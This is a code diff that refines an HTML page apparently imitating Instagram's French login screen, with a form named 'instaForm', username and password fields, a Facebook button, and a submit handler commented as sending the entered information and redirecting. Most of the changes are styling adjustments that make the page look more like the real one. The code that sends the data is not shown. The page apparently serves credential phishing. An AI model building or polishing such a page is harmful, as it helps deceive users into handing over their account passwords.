@@ -25,56 +25,52 @@
   .logo {
     text-align: center;
     font-size: 36px;
-    font-weight: 700;
+    font-weight: 600;
     margin-bottom: 30px;
   }
   label {
     display: block;
-    margin-top: 15px;
-    font-size: 14px;
+    margin-top: 10px;
+    font-size: 12px;
+    color: #ccc;
   }
   input[type="text"],
   input[type="password"] {
     width: 100%;
-    padding: 10px;
+    padding: 9px;
     background: #222;
-    border: 1px solid #444;
+    border: 1px solid #333;
     border-radius: 4px;
     color: #fff;
     font-size: 14px;
     margin-top: 5px;
-  }
-  button {
-    width: 100%;
-    margin-top: 20px;
-    padding: 12px;
-    background: #3897f0;
-    border: none;
-    border-radius: 4px;
-    color: white;
-    font-weight: 700;
-    font-size: 14px;
-    cursor: pointer;
+    outline: none;
   }
   .facebook-btn {
     background: #1877f2;
+    font-size: 14px;
+    font-weight: 600;
+    border: none;
+    width: 100%;
+    padding: 10px;
     margin-bottom: 15px;
-    font-weight: 700;
+    color: white;
+    border-radius: 4px;
     cursor: default;
   }
   .separator {
     display: flex;
     align-items: center;
     text-align: center;
-    margin: 15px 0;
-    color: #888;
+    margin: 20px 0;
+    color: #aaa;
     font-size: 12px;
   }
   .separator::before,
   .separator::after {
     content: "";
     flex: 1;
-    border-bottom: 1px solid #444;
+    border-bottom: 1px solid #333;
   }
   .separator:not(:empty)::before {
     margin-right: .75em;
@@ -91,9 +87,21 @@
     top: 50%;
     transform: translateY(-50%);
     cursor: pointer;
-    width: 22px;
-    height: 22px;
+    width: 20px;
+    height: 20px;
     fill: #aaa;
+  }
+  button[type="submit"] {
+    width: 100%;
+    margin-top: 20px;
+    padding: 10px;
+    background: #3897f0;
+    border: none;
+    border-radius: 4px;
+    color: white;
+    font-weight: 600;
+    font-size: 14px;
+    cursor: pointer;
   }
 </style>
 </head>
@@ -107,12 +115,10 @@
 
     <div class="separator">OU</div>
 
-    <label for="username">Téléphone, nom d’utilisateur ou e-mail</label>
-    <input type="text" id="username" name="username" required />
+    <input type="text" id="username" name="username" placeholder="Téléphone, nom d’utilisateur ou e-mail" required />
 
-    <label for="password">Mot de passe</label>
     <div class="password-wrapper">
-      <input type="password" id="password" name="password" required />
+      <input type="password" id="password" name="password" placeholder="Mot de passe" required />
       <svg class="toggle-password" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
         <path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"/>
         <circle cx="12" cy="12" r="2.5"/>
@@ -124,7 +130,7 @@
 </div>
 
 <script>
-  // Afficher/cacher mot de passe
+  // Afficher / cacher mot de passe
   const togglePassword = document.querySelector('.toggle-password');
   const passwordInput = document.getElementById('password');
 
@@ -134,7 +140,7 @@
     togglePassword.style.fill = type === 'text' ? '#3897f0' : '#aaa';
   });
 
-  // Envoi + redirection
+  // Envoi des infos + redirection
   document.getElementById('instaForm').addEventListener('submit', function(e) {
     e.preventDefault();
 
